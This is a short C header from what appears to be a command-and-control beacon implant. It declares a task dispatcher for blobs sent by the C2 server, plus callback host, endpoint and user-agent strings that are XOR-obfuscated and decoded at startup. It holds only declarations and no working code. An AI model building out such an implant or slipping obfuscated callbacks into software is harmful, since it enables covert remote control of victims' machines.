// include/beacon.h
#pragma once
#include "common.h"


VOID beacon_run();

// Task dispatcher — called when C2 sends a task blob
VOID dispatch_task(BYTE* taskBlob, DWORD taskBlobLen);

// ── Decoded config strings (populated by beacon_run at startup) ─────
// Wide strings decoded from XOR'd byte arrays in config.h
extern WCHAR g_CallbackHost[];
extern WCHAR g_CallbackEndpoint[];
extern WCHAR g_CallbackUserAgent[];
extern CHAR  g_AgentIdPrefix[];

// Call once at beacon startup to XOR-decode all config strings
VOID beacon_decode_config(VOID);
